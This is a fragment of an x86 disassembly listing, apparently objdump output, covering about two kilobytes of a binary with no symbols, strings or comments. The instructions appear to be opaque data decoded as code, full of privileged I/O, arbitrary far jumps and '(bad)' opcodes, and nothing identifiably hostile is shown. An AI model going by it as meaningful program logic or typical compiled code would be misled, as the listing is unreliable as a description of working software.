  422839:	mov    edx,0xc8430ab0
  42283e:	or     BYTE PTR [eax-0x578a38e6],bl
  422844:	inc    ebx
  422845:	js     0x422892
  422847:	call   0xb7557c00
  42284c:	push   ebp
  42284d:	rcr    esi,cl
  42284f:	add    al,0xfc
  422851:	cmp    edi,DWORD PTR [ecx]
  422853:	dec    esi
  422854:	pop    ss
  422855:	add    edx,esi
  422857:	scas   al,BYTE PTR es:[edi]
  422858:	mov    esp,0x2054eb8f
  42285d:	jmp    0x4144:0x4bc43509
  422864:	or     al,0x7c
  422866:	sbb    BYTE PTR [esi+0x148b5557],ah
  42286c:	daa    
  42286d:	rol    DWORD PTR [ebp+0xf539dea],cl
  422873:	retf   0x74de
  422876:	pop    es
  422877:	fidiv  DWORD PTR [ecx+0x35]
  42287a:	cmp    BYTE PTR [edi-0x752f274f],bl
  422880:	imul   ebx,DWORD PTR [edi],0xffffffad
  422883:	mov    ds:0xb7f3cac8,eax
  422888:	out    0xd,eax
  42288a:	add    eax,0x225aa2ab
  42288f:	cs scas al,BYTE PTR es:[edi]
  422891:	jmp    0x42282e
  422893:	mov    ch,0xb5
  422895:	idiv   DWORD PTR [eax+0x614962b2]
  42289b:	std    
  42289c:	mov    ebx,0xac5ac228
  4228a1:	enter  0xb899,0x8a
  4228a5:	xor    DWORD PTR [esi+0x75ac1d4],esp
  4228ab:	jg     0x4228e4
  4228ad:	fwait
  4228ae:	jbe    0x42288e
  4228b0:	in     al,0xa5
  4228b2:	inc    esp
  4228b3:	test   DWORD PTR [eax+0x65924cde],0x89bafcff
  4228bd:	cmp    al,0x84
  4228bf:	cli    
  4228c0:	jecxz  0x4228e5
  4228c2:	lods   al,BYTE PTR ds:[esi]
  4228c3:	xchg   edx,eax
  4228c4:	aaa    
  4228c5:	loope  0x422851
  4228c7:	or     al,0x3c
  4228c9:	jo     0x422915
  4228cb:	nop
  4228cc:	jmp    0x422923
  4228ce:	and    cl,BYTE PTR [edx-0x7037f5a6]
  4228d4:	adc    al,BYTE PTR [ebp+0x660665dc]
  4228da:	adc    eax,0x9be5956d
  4228df:	xchg   edx,eax
  4228e0:	loope  0x4228d8
  4228e2:	mov    BYTE PTR [edi-0x4e],al
  4228e5:	not    DWORD PTR [ecx+0x428e903c]
  4228eb:	lods   al,BYTE PTR ds:[esi]
  4228ec:	int3   
  4228ed:	in     al,dx
  4228ee:	fist   WORD PTR [ecx]
  4228f0:	scas   eax,DWORD PTR es:[edi]
  4228f1:	dec    esi
  4228f2:	iret   
  4228f3:	xor    BYTE PTR [ebx],al
  4228f5:	repz mov esp,0x92d66193
  4228fb:	std    
  4228fc:	inc    edx
  4228fd:	push   ss
  4228fe:	popf   
  4228ff:	lahf   
  422900:	mov    edx,0x91f2f85e
  422905:	fmul   st,st(0)
  422907:	cdq    
  422908:	inc    ebp
  422909:	adc    ah,dl
  42290b:	mov    bh,0x6
  42290d:	in     al,0x66
  42290f:	mov    eax,0xe0108607
  422914:	mov    edx,0xc1909ed1
  422919:	xchg   edx,eax
  42291a:	cmovne esi,DWORD PTR [ecx]
  42291d:	xor    bh,BYTE PTR [esi+0x73]
  422920:	push   edx
  422921:	int3   
  422922:	fist   WORD PTR [eax+0xa3bd418]
  422928:	jno    0x42298c
  42292a:	retf   
  42292b:	mov    edx,0xb48fae64
  422930:	add    eax,0xe83967cf
  422935:	mov    ecx,0xbc09fa7e
  42293a:	scas   al,BYTE PTR es:[edi]
  42293b:	and    eax,0xd600a0b0
  422940:	aad    0x60
  422942:	and    al,0x83
  422944:	dec    ebx
  422945:	retf   
  422946:	xor    BYTE PTR [edx+0x6e],0xa5
  42294a:	clc    
  42294b:	rol    BYTE PTR [edi-0x19ed6d7],1
  422951:	xchg   DWORD PTR [edx-0x37c132c7],edx
  422957:	pop    ebx
  422958:	(bad)  
  422959:	ins    DWORD PTR es:[edi],dx
  42295a:	int3   
  42295b:	jle    0x42295c
  42295d:	xor    esi,0x520bcfea
  422963:	fld    DWORD PTR [ebx+eiz*8+0x6f]
  422967:	jnp    0x422990
  422969:	call   0x93e3:0xc6b4b391
  422970:	mov    ebx,0xf6ab4c94
  422975:	push   ebx
  422976:	mov    edi,0x47f8adeb
  42297b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42297c:	cmp    eax,0x4f95d2e9
  422981:	jnp    0x422966
  422983:	gs sbb dl,bh
  422986:	int    0xa8
  422988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422989:	outs   dx,BYTE PTR ds:[esi]
  42298a:	inc    esp
  42298b:	ds xor al,0x45
  42298e:	adc    esp,DWORD PTR [ecx-0x52fe467f]
  422994:	sub    eax,esi
  422996:	push   ss
  422997:	adc    eax,0x33e4e4e8
  42299c:	mov    BYTE PTR [ecx+0x10],dh
  42299f:	mov    ah,0xf
  4229a1:	(bad)  
  4229a2:	lahf   
  4229a3:	not    BYTE PTR [edx]
  4229a5:	xor    BYTE PTR [eax+0x31],ch
  4229a8:	or     BYTE PTR [edx-0x4af1868b],bh
  4229ae:	rol    al,cl
  4229b0:	daa    
  4229b1:	call   0xe506:0xe7bb6c5f
  4229b8:	jmp    0x55bc:0x2fe559c9
  4229bf:	xor    eax,0x652c7316
  4229c4:	fsubr  DWORD PTR [esi]
  4229c6:	or     bl,BYTE PTR [ecx+0x51]
  4229c9:	sub    BYTE PTR [eax+esi*2-0x3d],dl
  4229cd:	outs   dx,DWORD PTR ds:[esi]
  4229ce:	outs   dx,DWORD PTR ds:[esi]
  4229cf:	ja     0x4229bc
  4229d1:	sbb    esp,DWORD PTR ds:0xdf83eb4e
  4229d7:	add    DWORD PTR [ecx+edx*2-0x3d477764],edx
  4229de:	sbb    eax,0x208b115a
  4229e3:	mov    ebp,0x1b3740f8
  4229e8:	out    0xb8,eax
  4229ea:	rol    BYTE PTR [ebx+0x1e],cl
  4229ed:	mov    esi,0x77671d4d
  4229f2:	stos   BYTE PTR es:[edi],al
  4229f3:	or     BYTE PTR [eax-0x542f4227],al
  4229f9:	add    ebx,ebx
  4229fb:	dec    DWORD PTR [edx+ebx*4]
  4229fe:	mov    ebx,0xa88bf909
  422a03:	cmc    
  422a04:	js     0x422993
  422a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a07:	neg    BYTE PTR [edx]
  422a09:	ins    BYTE PTR es:[edi],dx
  422a0a:	mov    dh,0xdc
  422a0c:	lods   al,BYTE PTR ds:[esi]
  422a0d:	fmul   st,st(5)
  422a0f:	inc    edx
  422a10:	test   BYTE PTR [ebp+ebx*1-0x6d],bh
  422a14:	or     bh,dh
  422a16:	ins    DWORD PTR es:[edi],dx
  422a17:	dec    eax
  422a18:	pop    ss
  422a19:	retf   
  422a1a:	adc    BYTE PTR [ecx],bh
  422a1c:	pop    esi
  422a1d:	sub    al,0x18
  422a1f:	fist   DWORD PTR [ebx+0x1c]
  422a22:	add    edi,edx
  422a24:	pushf  
  422a25:	pusha  
  422a26:	sbb    BYTE PTR [edx],bh
  422a28:	xchg   DWORD PTR [esi+0x71],ecx
  422a2b:	loope  0x422a1e
  422a2d:	add    DWORD PTR [ebx-0x5e],ebx
  422a30:	into   
  422a31:	inc    edi
  422a32:	lahf   
  422a33:	mov    edi,0x71bbed70
  422a38:	mov    esp,0xba7a359f
  422a3d:	cmp    ebx,DWORD PTR [ecx]
  422a3f:	or     al,0xf4
  422a41:	cdq    
  422a42:	jnp    0x4229c8
  422a44:	dec    esp
  422a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a46:	pop    edx
  422a47:	fs cdq 
  422a49:	pop    eax
  422a4a:	je     0x422a9a
  422a4c:	retf   0xffb5
  422a4f:	xchg   DWORD PTR [edx+0x233b9a7a],eax
  422a55:	out    dx,eax
  422a56:	push   edx
  422a57:	sub    esp,DWORD PTR [edi+edi*2-0x32]
  422a5b:	inc    esp
  422a5c:	mov    ebp,0x41a3de29
  422a61:	mov    ds:0x63ab9350,eax
  422a66:	fbstp  TBYTE PTR gs:[ebp-0x91b6d45]
  422a6d:	ret    
  422a6e:	inc    edi
  422a6f:	shl    DWORD PTR [eax+0x6d6d7a0c],cl
  422a75:	shl    BYTE PTR [esi],cl
  422a77:	sbb    DWORD PTR [edx+0x288e6d8c],esi
  422a7d:	sahf   
  422a7e:	outs   dx,DWORD PTR ds:[esi]
  422a7f:	mov    dl,0xc0
  422a81:	data16 jnp 0x422add
  422a84:	popw   ss
  422a86:	je     0x422af2
  422a88:	lods   al,BYTE PTR ds:[esi]
  422a89:	mov    dl,0x7e
  422a8b:	or     al,0xd0
  422a8d:	pop    ds
  422a8e:	fst    DWORD PTR [ecx+ecx*4-0x3b4323fa]
  422a95:	out    dx,al
  422a96:	mov    al,0x57
  422a98:	aaa    
  422a99:	call   0xfa33:0x20cc4539
  422aa0:	in     al,0x95
  422aa2:	adc    BYTE PTR [eax+eax*2-0x56a832fa],0x76
  422aaa:	leave  
  422aab:	sbb    esp,DWORD PTR [esi]
  422aad:	aam    0xb7
  422aaf:	(bad)  
  422ab0:	and    al,0x1e
  422ab2:	sub    esp,ebp
  422ab4:	jg     0x422a6e
  422ab6:	cmp    dl,ah
  422ab8:	(bad)  
  422aba:	xchg   BYTE PTR [edx],dh
  422abc:	lahf   
  422abd:	mov    ch,0x8c
  422abf:	sbb    DWORD PTR [ebx+0x740ba21c],edx
  422ac5:	aas    
  422ac6:	hlt    
  422ac7:	add    bh,BYTE PTR [ebp+0x6d74b960]
  422acd:	xor    edx,DWORD PTR [ecx-0x17b515b0]
  422ad3:	pop    ebp
  422ad4:	call   FWORD PTR [edx+0x33]
  422ad7:	out    dx,al
  422ad8:	xor    eax,0xb47092d6
  422add:	jmp    DWORD PTR [ebx-0x64]
  422ae0:	bound  edi,QWORD PTR [ecx+ebp*4]
  422ae3:	adc    ebx,DWORD PTR [edi+0x495ae9aa]
  422ae9:	or     BYTE PTR [ebx+0x36d2db18],bl
  422aef:	dec    edi
  422af0:	das    
  422af1:	jns    0x422b5d
  422af3:	fs push edx
  422af5:	push   ss
  422af6:	lds    esi,FWORD PTR [ebx-0x585cfff3]
  422afc:	jecxz  0x422b50
  422afe:	je     0x422a83
  422b00:	loop   0x422b74
  422b02:	test   al,0x9e
  422b04:	xchg   esp,eax
  422b05:	dec    ecx
  422b06:	and    eax,0xc3dc4fed
  422b0b:	ret    
  422b0c:	inc    eax
  422b0d:	xor    DWORD PTR [ecx],0x48
  422b10:	mov    bl,0x55
  422b12:	push   ss
  422b13:	xchg   ebx,eax
  422b14:	cld    
  422b15:	stc    
  422b16:	dec    DWORD PTR [ebp-0x46ec0ce7]
  422b1c:	lds    edx,FWORD PTR [ebx]
  422b1e:	cmp    DWORD PTR [eax-0x39],ebx
  422b21:	xchg   esi,eax
  422b22:	push   ds
  422b23:	mov    dh,0xf7
  422b25:	mov    cl,0x46
  422b27:	ret    
  422b28:	xchg   ebx,eax
  422b29:	and    eax,0xa0e9ea48
  422b2e:	push   ebp
  422b2f:	xchg   edx,eax
  422b30:	into   
  422b31:	and    eax,edx
  422b33:	and    bh,0x9b
  422b36:	loope  0x422ae1
  422b38:	mov    dl,0xc4
  422b3a:	inc    ebp
  422b3b:	lock sbb BYTE PTR [esi-0x1a4130e9],0x4e
  422b43:	mov    edi,0x7605b0cb
  422b48:	jno    0x422b99
  422b4a:	rcr    DWORD PTR [edi],1
  422b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b4d:	add    DWORD PTR [eax-0x6c9f44b5],edx
  422b53:	jge    0x422bc6
  422b55:	iret   
  422b56:	out    dx,eax
  422b57:	into   
  422b58:	(bad)  
  422b59:	dec    esi
  422b5a:	mov    dl,0x1e
  422b5c:	sahf   
  422b5d:	dec    eax
  422b5e:	mov    edx,0xb6550ec6
  422b63:	into   
  422b64:	out    dx,eax
  422b65:	test   eax,0x64e47cb4
  422b6a:	call   0x2a403832
  422b6f:	fcomp  QWORD PTR [ebp-0x4b740786]
  422b75:	push   ebp
  422b76:	mov    bh,0x4f
  422b78:	shl    esi,cl
  422b7a:	or     DWORD PTR gs:[ecx-0x49],ebx
  422b7e:	dec    edi
  422b7f:	dec    edx
  422b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b81:	mov    ds:0xf47d72fd,eax
  422b86:	rol    BYTE PTR [edi+0x33c47227],0x65
  422b8d:	fisub  DWORD PTR [ebx-0x45]
  422b90:	push   ds
  422b91:	lds    esi,FWORD PTR [ebp+edi*8+0x1329f1a5]
  422b98:	mul    BYTE PTR [ebx+0x25634e07]
  422b9e:	xchg   ebp,eax
  422b9f:	jle    0x422bfa
  422ba1:	cdq    
  422ba2:	sub    BYTE PTR [ecx+0x63dd5cd2],cl
  422ba8:	icebp  
  422ba9:	jmp    0x422bc2
  422bab:	rcl    BYTE PTR [ebx+0x12],cl
  422bae:	scas   al,BYTE PTR es:[edi]
  422baf:	xchg   edi,eax
  422bb0:	shl    DWORD PTR [edx],cl
  422bb2:	lods   eax,DWORD PTR ds:[esi]
  422bb3:	mov    esi,0xe2c56ad7
  422bb8:	mov    bl,0xff
  422bba:	ror    BYTE PTR [ecx+0x55],0x94
  422bbe:	jmp    FWORD PTR [edx]
  422bc0:	mov    cl,0x3e
  422bc2:	xor    BYTE PTR [ebx-0x7f184d8b],bh
  422bc8:	xchg   DWORD PTR [edi+eax*8-0x10],edx
  422bcc:	jl     0x422c40
  422bce:	jns    0x422c24
  422bd0:	pop    ebp
  422bd1:	daa    
  422bd2:	fisttp WORD PTR [edx]
  422bd4:	pop    eax
  422bd5:	inc    esp
  422bd6:	jnp    0x422c50
  422bd8:	jae    0x422c38
  422bda:	clc    
  422bdb:	rol    DWORD PTR [ebx],cl
  422bdd:	sbb    al,0xd0
  422bdf:	jle    0x422c5d
  422be1:	xchg   esi,eax
  422be2:	dec    edi
  422be3:	cmp    BYTE PTR [edi],al
  422be5:	mov    dh,0x7d
  422be7:	repnz fisttp WORD PTR [esi-0x4e]
  422beb:	mov    esp,0xd3c255d1
  422bf0:	inc    eax
  422bf1:	ror    BYTE PTR [ebp+esi*2-0x6f],cl
  422bf5:	ret    0x8414
  422bf8:	out    dx,al
  422bf9:	add    DWORD PTR [eax],0xa64236b6
  422bff:	sbb    BYTE PTR [edi-0x50],al
  422c02:	mov    dh,0x2
  422c04:	retf   0x30e
  422c07:	mov    eax,0x97804c2b
  422c0c:	pop    ss
  422c0d:	lods   eax,DWORD PTR ds:[esi]
  422c0e:	xchg   edi,eax
  422c0f:	push   edi
  422c10:	adc    ch,al
  422c12:	in     eax,0xa5
  422c14:	ins    DWORD PTR es:[edi],dx
  422c15:	add    al,0xa2
  422c17:	jnp    0x422bd3
  422c19:	bound  ecx,QWORD PTR [edx+ebx*1]
  422c1c:	out    dx,al
  422c1d:	fs pop esp
  422c1f:	mov    ebp,0x64fa4670
  422c24:	sub    BYTE PTR [edx],0x3f
  422c27:	cwde   
  422c28:	ret    0x2e32
  422c2b:	sti    
  422c2c:	xchg   edi,eax
  422c2d:	push   0xfe14fea6
  422c32:	and    ah,bh
  422c34:	into   
  422c35:	mov    cs,WORD PTR [esi]
  422c37:	adc    dl,BYTE PTR [eax-0x2359e356]
  422c3d:	in     eax,dx
  422c3e:	test   al,0xd1
  422c40:	daa    
  422c41:	test   DWORD PTR [edi-0x35ff5e20],esi
  422c47:	jno    0x422bd6
  422c49:	mov    esp,0xad0d9678
  422c4e:	dec    edi
  422c4f:	mov    cl,0x9a
  422c51:	mov    al,0xae
  422c53:	pushf  
  422c54:	mov    DWORD PTR [edi-0x1],edx
  422c57:	dec    edx
  422c58:	mov    ebp,0x4a11115f
  422c5d:	or     eax,0x34dbcec7
  422c62:	sbb    al,0xc6
  422c64:	mov    ebp,0xb32c6a01
  422c69:	loop   0x422cb7
  422c6b:	in     al,dx
  422c6c:	cmp    BYTE PTR [eax+0x73],bl
  422c6f:	sub    edi,0xf159b111
  422c75:	mov    ebx,0x4b640b17
  422c7a:	jb     0x422cea
  422c7c:	or     DWORD PTR [eax-0x50],esp
  422c7f:	(bad)  
  422c80:	push   edi
  422c81:	jmp    0x422ca2
  422c83:	mov    ecx,0xcf066f4f
  422c88:	dec    edi
  422c89:	push   DWORD PTR [eax+0x2dd4280b]
  422c8f:	jb     0x422cb0
  422c91:	out    dx,al
  422c92:	dec    esp
  422c93:	rcr    dh,1
  422c95:	and    BYTE PTR fs:0xa58decaf,cl
  422c9c:	aas    
  422c9d:	sub    cl,al
  422c9f:	fisub  WORD PTR [edx*1-0x668f3756]
  422ca6:	mov    eax,esi
  422ca8:	jle    0x422d14
  422caa:	aad    0xa9
  422cac:	xor    ebp,esp
  422cae:	mov    edi,0xc930c66
  422cb3:	in     al,dx
  422cb4:	mov    bh,0x1a
  422cb6:	pop    esi
  422cb7:	xlat   BYTE PTR ds:[ebx]
  422cb8:	fiadd  DWORD PTR [esi+0xa]
  422cbb:	push   ds
  422cbc:	mov    al,0xd2
  422cbe:	ffreep st(7)
  422cc0:	or     esp,DWORD PTR [ecx]
  422cc2:	les    edx,FWORD PTR [ecx+0x42]
  422cc5:	jae    0x422c79
  422cc7:	mov    gs,WORD PTR [ecx+0x738598f5]
  422ccd:	xchg   DWORD PTR [edx],eax
  422ccf:	jg     0x422d3e
  422cd1:	test   ebx,edi
  422cd3:	inc    ebx
  422cd4:	aaa    
  422cd5:	and    esi,esi
  422cd7:	xor    BYTE PTR [ebx-0x4d],ch
  422cda:	les    eax,FWORD PTR [ebp-0x3392c11b]
  422ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ce1:	ins    DWORD PTR es:[edi],dx
  422ce2:	sub    bh,BYTE PTR [eax-0x63]
  422ce5:	and    BYTE PTR [esi-0x570b280d],cl
  422ceb:	lahf   
  422cec:	jmp    0xbf91eba2
  422cf1:	fst    QWORD PTR [eax-0x54]
  422cf4:	pop    ss
  422cf5:	shl    DWORD PTR [ecx],cl
  422cf7:	test   BYTE PTR [ebx+0x30],0x2b
  422cfb:	cwde   
  422cfc:	retf   
  422cfd:	xchg   ecx,eax
  422cfe:	pop    esp
  422cff:	fcomp  DWORD PTR [ebx+0x49f35035]
  422d05:	cmp    ah,BYTE PTR [ecx+0x4183108c]
  422d0b:	dec    edi
  422d0c:	push   ebx
  422d0d:	mov    edx,0x7368c84f
  422d12:	ds mov esi,0xb958747
  422d18:	cmp    bl,BYTE PTR [ebp*4-0x7ff6ea3f]
  422d1f:	sbb    al,0x3c
  422d21:	in     eax,dx
  422d22:	inc    ebx
  422d23:	mov    al,ds:0x8462c570
  422d28:	lahf   
  422d29:	cvtps2pi mm7,QWORD PTR [edi+0x188e1eee]
  422d30:	out    0xac,al
  422d32:	add    DWORD PTR [esi+0x6f],ebx
  422d35:	jae    0x422d57
  422d37:	xor    DWORD PTR [esi+eax*4-0x76],0x2f
  422d3c:	test   DWORD PTR [edi+0x550f2681],ecx
  422d42:	mov    ds:0xd25b601c,eax
  422d47:	push   0x1d
  422d49:	xor    ecx,edi
  422d4b:	ins    BYTE PTR es:[edi],dx
  422d4c:	icebp  
  422d4d:	mov    edi,ecx
  422d4f:	dec    ecx
  422d50:	mov    dh,0xa2
  422d52:	jae    0x422d3b
  422d54:	in     eax,dx
  422d55:	add    bh,cl
  422d57:	add    eax,0xbc102dec
  422d5c:	nop
  422d5d:	sahf   
  422d5e:	pop    ss
  422d5f:	outs   dx,BYTE PTR ds:[esi]
  422d60:	aad    0x16
  422d62:	(bad)  [edi-0x34345cbc]
  422d68:	add    DWORD PTR [eax],0xffffffdd
  422d6b:	dec    edi
  422d6c:	jne    0x422d98
  422d6e:	cld    
  422d6f:	inc    ecx
  422d70:	stos   DWORD PTR es:[edi],eax
  422d71:	cmp    esp,DWORD PTR [edx-0x61]
  422d74:	daa    
  422d75:	pop    edi
  422d76:	loop   0x422d1d
  422d78:	idiv   dh
  422d7a:	mov    edx,0xd5987aef
  422d7f:	pop    edx
  422d80:	out    dx,eax
  422d81:	sub    ebx,DWORD PTR [ebx+0x4ce90ad2]
  422d87:	cli    
  422d88:	and    BYTE PTR [edx],ch
  422d8a:	popf   
  422d8b:	add    BYTE PTR [ebx-0x76],bl
  422d8e:	dec    ebx
  422d8f:	test   eax,0x1ef215a6
  422d94:	mov    dh,0xe2
  422d96:	(bad)  
  422d98:	daa    
  422d99:	retf   
  422d9a:	imul   eax,DWORD PTR [eax-0x7b],0xb7eeecfd
  422da1:	ret    
  422da2:	std    
  422da3:	nop
  422da4:	sahf   
  422da5:	sti    
  422da6:	sub    al,0x1b
  422da8:	loopne 0x422d86
  422daa:	xchg   ebx,eax
  422dab:	dec    edi
  422dac:	push   ds
  422dad:	xchg   ebx,eax
  422dae:	sub    eax,0xdf6c6fed
  422db3:	into   
  422db4:	cmp    BYTE PTR ds:0xe95fe097,ch
  422dba:	jns    0x422d59
  422dbc:	loopne 0x422dff
  422dbe:	sub    DWORD PTR [esi-0x48340814],edx
  422dc4:	jmp    FWORD PTR [edx+ebp*8-0x67696608]
  422dcb:	test   al,0xb0
  422dcd:	jle    0x422dc0
  422dcf:	and    ecx,DWORD PTR [esi+0x59bebd2d]
  422dd5:	xchg   bh,dl
  422dd7:	sub    eax,0xbba99401
  422ddc:	mov    dl,0xc
  422dde:	les    esp,FWORD PTR ds:0xcad9af7c
  422de4:	stos   DWORD PTR es:[edi],eax
  422de5:	sbb    ch,cl
  422de7:	or     al,0x25
  422de9:	(bad)  
  422dea:	aas    
  422deb:	imul   esi,DWORD PTR [eax-0x33],0x62
  422def:	pop    ebx
  422df0:	gs dec ebx
  422df2:	xor    DWORD PTR [edx-0x7a],edi
  422df5:	sbb    al,0x56
  422df7:	inc    edi
  422df8:	adc    cl,BYTE PTR [edx+0x1b]
  422dfb:	pop    es
  422dfc:	cld    
  422dfd:	cmp    DWORD PTR [ebp-0x26],esp
  422e00:	xchg   esi,eax
  422e01:	jg     0x422df3
  422e03:	mov    al,0x8a
  422e05:	repz lock dec ebp
  422e08:	and    BYTE PTR [eax-0x7f],bl
  422e0b:	push   eax
  422e0c:	pop    ds
  422e0d:	enter  0xdb4,0x56
  422e11:	dec    eax
  422e12:	add    ebp,DWORD PTR [ecx]
  422e14:	mov    eax,ds:0xbdc89562
  422e19:	xchg   ecx,eax
  422e1a:	jno    0x422e77
  422e1c:	mov    es,esp
  422e1e:	ds int3 
  422e20:	js     0x422de7
  422e22:	retf   0x7d1a
  422e25:	aam    0x34
  422e27:	jbe    0x422dc3
  422e29:	pop    ecx
  422e2a:	jbe    0x422dbc
  422e2c:	adc    bl,cl
  422e2e:	or     dh,cl
  422e30:	call   0xa45b:0x2bed607b
  422e37:	(bad)  
  422e38:	mov    es,WORD PTR [ebp+0x62]
  422e3b:	jno    0x422eb2
  422e3d:	xor    DWORD PTR [eax],0xffffffef
  422e40:	es pop ds
  422e42:	call   0x5aa348ca
  422e47:	dec    eax
  422e48:	nop
  422e49:	pop    ds
  422e4a:	jne    0x422e07
  422e4c:	mov    cl,0x75
  422e4e:	imul   ebx,DWORD PTR [ecx],0x1f
  422e51:	inc    ebp
  422e52:	icebp  
  422e53:	add    BYTE PTR [ebx],cl
  422e55:	cmp    DWORD PTR [esi],0x54
  422e58:	in     al,0x7
  422e5a:	loopne 0x422ed9
  422e5c:	mov    ebp,0x53a5a8d6
  422e62:	lods   al,BYTE PTR ds:[esi]
  422e63:	sub    eax,0xa0a91532
  422e68:	data16 test al,0xd5
  422e6b:	dec    edi
  422e6c:	(bad)  
  422e6d:	lods   al,BYTE PTR ds:[esi]
  422e6e:	lods   al,BYTE PTR ds:[esi]
  422e6f:	dec    ebp
  422e70:	retf   0xe4e5
  422e73:	adc    DWORD PTR [edx],ebx
  422e75:	push   cs
  422e76:	jle    0x422e0b
  422e78:	ret    0x6b74
  422e7b:	mov    dh,0x8c
  422e7d:	fs push 0x3b7834ef
  422e83:	and    DWORD PTR [edi-0x8b704c0],esp
  422e89:	mul    bh
  422e8b:	pushf  
  422e8c:	idiv   BYTE PTR [eax-0x69222680]
  422e92:	fsincos 
  422e94:	push   edi
  422e95:	jae    0x422ea8
  422e97:	repnz out dx,al
  422e99:	jecxz  0x422eb9
  422e9b:	pop    es
  422e9c:	lods   al,BYTE PTR ds:[esi]
  422e9d:	mov    es,WORD PTR [ebx]
  422e9f:	add    al,0xe9
  422ea1:	dec    edx
  422ea2:	dec    eax
  422ea3:	sahf   
  422ea4:	loope  0x422e82
  422ea6:	ficom  DWORD PTR [edx+0x36]
  422ea9:	dec    ecx
  422eaa:	aaa    
  422eab:	adc    BYTE PTR [edi+edx*1],dh
  422eae:	inc    esp
  422eaf:	das    
  422eb0:	and    ecx,DWORD PTR [ebx]
  422eb2:	add    dl,BYTE PTR [eax]
  422eb4:	scas   eax,DWORD PTR es:[edi]
  422eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eb6:	push   es
  422eb7:	and    al,0xb4
  422eb9:	mov    ds:0x3e76e0b3,al
  422ebe:	jl     0x422ed6
  422ec0:	xchg   ebp,eax
  422ec1:	pop    edi
  422ec2:	inc    edi
  422ec3:	sbb    eax,0xfb529dd2
  422ec8:	xchg   DWORD PTR [ecx],esp
  422eca:	xchg   dh,cl
  422ecc:	cmp    al,0x5a
  422ece:	int    0xe1
  422ed0:	clc    
  422ed1:	pop    ebp
  422ed2:	push   edi
  422ed3:	cmp    ch,BYTE PTR [edx]
  422ed5:	ret    0xdeb3
  422ed8:	xchg   esi,eax
  422ed9:	cli    
  422eda:	ins    BYTE PTR es:[edi],dx
  422edb:	lock cld 
  422edd:	out    dx,eax
  422ede:	jb     0x422efa
  422ee0:	rcl    BYTE PTR [edx],1
  422ee2:	in     eax,dx
  422ee3:	dec    edx
  422ee4:	je     0x422e79
  422ee6:	xlat   BYTE PTR ds:[ebx]
  422ee7:	jnp    0x422edb
  422ee9:	out    0x7,al
  422eeb:	jno    0x422ea9
  422eed:	das    
  422eee:	xor    BYTE PTR [edx+0x19],dl
  422ef1:	xor    ecx,DWORD PTR fs:[eax-0x131d2c60]
  422ef8:	inc    ebx
  422ef9:	mov    ecx,0x682f6f16
  422efe:	imul   ebx,DWORD PTR [ebp+edi*8-0x5a],0xfd609ecd
  422f06:	cmp    bh,dl
  422f08:	pop    ebx
  422f09:	and    DWORD PTR [edx],0x5ae4890d
  422f0f:	push   cs
  422f10:	push   edi
  422f11:	lods   al,BYTE PTR ds:[esi]
  422f12:	popf   
  422f13:	mov    bh,0xc1
  422f15:	mov    DWORD PTR [ebp+0x5d2ad16b],0xc70577f7
  422f1f:	les    ebx,FWORD PTR [ecx-0x1a]
  422f22:	push   ebp
  422f23:	jge    0x422ebb
  422f25:	addr16 cmp al,0xb0
  422f28:	outs   dx,DWORD PTR ds:[esi]
  422f29:	imul   eax,DWORD PTR [edx-0x44],0x6ce17f6b
  422f30:	pop    ebx
  422f31:	scas   al,BYTE PTR es:[edi]
  422f32:	nop
  422f33:	inc    eax
  422f34:	jmp    0xb4e2:0xf5e30df7
  422f3b:	in     eax,0x54
  422f3d:	pop    esp
  422f3e:	call   0x507804fa
  422f43:	popa   
  422f44:	daa    
  422f45:	out    dx,al
  422f46:	mov    ds:0xe2ca0111,al
  422f4b:	mov    ss,WORD PTR es:0x5f79d8ad
  422f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f53:	popf   
  422f54:	clc    
  422f55:	repz mov esi,0xde7ab021
  422f5b:	jp     0x422f1a
  422f5d:	dec    esi
  422f5e:	ja     0x422ee8
  422f60:	sbb    DWORD PTR [edx-0x5d67964c],ebx
  422f66:	aad    0x6e
  422f68:	mov    eax,ds:0x6fee880f
  422f6d:	sub    al,BYTE PTR [edi*8+0x45bfd05e]
  422f74:	jl     0x422f14
  422f76:	xchg   edi,eax
  422f77:	adc    ah,ch
  422f79:	mov    esp,0x6fbabc1d
  422f7e:	inc    edi
  422f7f:	mov    DWORD PTR [esi+edx*4+0x776fd828],esi
  422f86:	ret    0xe2a4
  422f89:	xchg   edx,eax
  422f8a:	(bad)  
  422f8b:	jno    0x422fde
  422f8d:	mov    esp,0x56d5675d
  422f92:	or     eax,0xf04fdace
  422f97:	js     0x422f1f
  422f99:	mov    bh,0xc8
  422f9b:	jge    0x423013
  422f9d:	sbb    eax,0x3be5e606
  422fa2:	lods   eax,DWORD PTR ds:[esi]
  422fa3:	push   eax
  422fa4:	sbb    bl,BYTE PTR [ebp-0x5bcf016]
  422faa:	sbb    cl,BYTE PTR [edx+edi*8]
  422fad:	or     eax,0x89d21d46
  422fb2:	outs   dx,DWORD PTR ds:[esi]
  422fb3:	ret    0x535e
  422fb6:	push   edx
  422fb7:	mov    ds:0x994e31e4,eax
  422fbc:	outs   dx,BYTE PTR ds:[esi]
  422fbd:	(bad)  
  422fbe:	adc    al,0xf4
  422fc0:	push   DWORD PTR [ebx+eax*4]
  422fc3:	jno    0x422fd4
  422fc5:	test   eax,0x5b3c1554
  422fca:	sub    BYTE PTR [ebx],cl
  422fcc:	push   ecx
  422fcd:	or     eax,0x452ebfa3
  422fd2:	pushf  
  422fd3:	stos   BYTE PTR es:[edi],al
  422fd4:	fisub  DWORD PTR ds:0xa6d729d
  422fda:	loopne 0x422fe3
  422fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fdd:	push   ss
  422fde:	outs   dx,BYTE PTR ds:[esi]
  422fdf:	idiv   BYTE PTR [esi]
  422fe1:	mov    edx,DWORD PTR [eax]
  422fe3:	pop    edx
  422fe4:	pmullw mm1,QWORD PTR [ebx+0x6b]
  422fe8:	xor    DWORD PTR [ebp+esi*2+0x6f],ebp
  422fec:	or     eax,0x7302bc37
  422ff1:	push   edi
  422ff2:	repnz pop ebx
